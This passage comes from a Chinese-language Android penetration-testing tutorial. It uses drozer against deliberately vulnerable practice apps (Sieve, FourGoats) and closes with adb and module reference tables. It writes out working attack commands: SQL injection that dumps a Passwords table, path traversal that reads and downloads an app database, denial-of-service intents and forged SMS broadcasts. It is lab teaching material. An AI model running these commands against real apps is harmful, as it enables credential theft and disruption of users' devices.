1、进一步测试可访问的 URI 是否存在注入
    run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
    run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
出现语法错误，存在SQL注入
2、利用 drozer 内置注入扫描模块进行扫描,扫描存在注入
    run scanner.provider.injection -a com.mwr.example.sieve
3、继续利用，列出所有数据表，得知数据库表有 `name`、`android_metadata`、`Passwords`、`Key`
    run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"
4、单独查看表中数据，例查询 `Passwords` 表数据
    run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Passwords;--"
#### 目录遍历
1、利用 drozer 自带模块扫描目录遍历，存在两个漏洞
`content://com.mwr.example.sieve.FileBackupProvider/`,`content://com.mwr.example.sieve.FileBackupProvider`
2、对其 URI 进行文件读取
    run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
3、读取更多信息
    run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db
4、下载文件 (C:\Users\oooo\Desktop\database.db为文件保存路径)
    run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db C:\\Users\\oooo\\Desktop\\database.db
### Broadcast Receiver
漏洞种类 | 危害  
---|---  
敏感信息泄露 |
发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。  
权限绕过 |
可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentFilter参数，动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等  
消息伪造 | 暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患  
拒绝服务 |
如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。
拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。  
#### 拒绝服务
1、查看针对 broadcast 数据组件具体的攻击面
    run app.service.info -a org.owasp.goatdroid.fourgoats
2、针对 service 攻击面进行测试需要先找到相应的 action 名，这边使用 jadx 进行反编译，查看 AndroidManifest.xml
寻找 action
打开 FourGoats app 停留在首页界面，由于存漏洞，直接调用导致拒绝服务，APP程序自动退出，返回桌面
    run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService
3、直接利用反编译获取的 action 名执行命令也可导致拒绝服务
    run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS
未执行前
执行后，程序退出，导致拒绝服务
#### 消息伪造（发送恶意广播）
利用 jadx 反编译 apk，查看 broadcast receivers 模块具体代码，审计代码可知发送广播需要两个参数命令
具体执行代码为
    run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 13800000000 --extra string message test
### Service
参考文章：Service(服务)是一个一种可以在后台执行长时间运行操作而没有用户界面的应用组件。服务可由其他应用组件启动（如Activity），服务一旦被启动将在后台一直运行，即使启动服务的组件（Activity）已销毁也不受影响。
此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。
漏洞种类 | 危害  
---|---  
权限提升 |
当一个service配置了intent`-`filter默认是被导出的，如果没对调用Service进行权限，限制或者是没有对调用者的身份进行有效验证，那么恶意构造的APP都可以对此Service传入恰当的参数进行调用，导致恶意行为发生比如调用具有system权限的删除卸载服务删除卸载其他应用。  
service劫持 | 隐式启动services,当存在同名services,先安装应用的services优先级高  
消息伪造 | 暴露的Service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患  
拒绝服务 | Service的拒绝服务主要来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致程序崩溃  
具体例子请参考文章：
## 四、扩展知识点
### adb使用
adb查看连接设备的android日志
    //格式1：打印默认日志数据
    adb logcat 
    //格式2：需要打印日志详细时间的简单数据
    adb logcat -v time
    //格式3：需要打印级别为Error的信息
    adb logcat *:E
    //格式4：需要打印时间和级别是Error的信息
    adb logcat -v time *:E
    //格式5：将日志保存到电脑固定的位置，比如D:\log.txt
    adb logcat -v time >D:\log.txt
    //格式5：日志监听
    adb logcat |grep packagename(app包名)
### APP模块说明
模块名 | 作用  
---|---  
app.activity.forintent | 通过intent查找它的activity  
app.activity.info | 获取activities信息  
app.activity.start | 开启 Activity  
app.broadcast.info | 获取broadcast receivers信息  
app.broadcast.send | 发送广播  
app.broadcast.sniff | 嗅探广播中intent的数据  
app.package.attacksurface | 确定安装包的可攻击面  
app.package.backup | 列出可备份的包  
app.package.debuggable | 列出可debug的包  
app.package.info | 获取已安装包的信息  
app.package.launchintent | 获取程序启动的activity信息  
app.package.list | 手机已安装的程序包  
app.package.manifest | 获取程序manifest文件信息  
app.package.native | 列出Native libraries 信息  
app.package.shareduid | 查找拥有共同uid的包和他们所有的权限  
app.provider.columns | 展示content provider URI的各列  
app.provider.delete | 删除content provider URI的内容  
app.provider.download | 使用openInputStream读取指定uri的内容，并下载在电脑中  
app.provider.info | 获取 content providers信息  
app.provider.insert | 插入数据到content provider  
app.provider.query | 查询content provider 内容  
app.provider.read | 使用openInputStream读取指定uri的内容  
app.provider.update | 更新content provider的内容  
app.service.info | 获取services的信息  
app.service.send | 使用 Message攻击暴露的service，其service实现了handleMessage  
app.service.start | 开启服务  
app.service.stop | 停止服务  
## 五、总结
文章编写断断续续，主要是复现环境弄得比较费劲，内容多为参考网上师傅们的文章，属于前人栽树，后人乘凉了，知识点也是好几年前的知识，一系列学习下来，扩展了
APP 测试的思路，总体上基于 drozer 工具下进行测试，根据每个组件的特性进行单点突破。
## 六、参考
    https://blog.yorek.xyz/android/paid/zsxq/week17-android-components/
    https://bbs.pediy.com/thread-269211.htm
    https://bbs.pediy.com/thread-269255.htm
    https://bbs.pediy.com/thread-269309.htm
    https://bbs.pediy.com/thread-269447.htm
    https://www.cnblogs.com/wjrblogs/p/13953761.html
    https://dl.google.com/android/repository/platform-tools_r33.0.3-windows.zip
    https://bbs.pediy.com/thread-262208.htm
    https://www.cnblogs.com/zhaoyixiang/p/11236458.html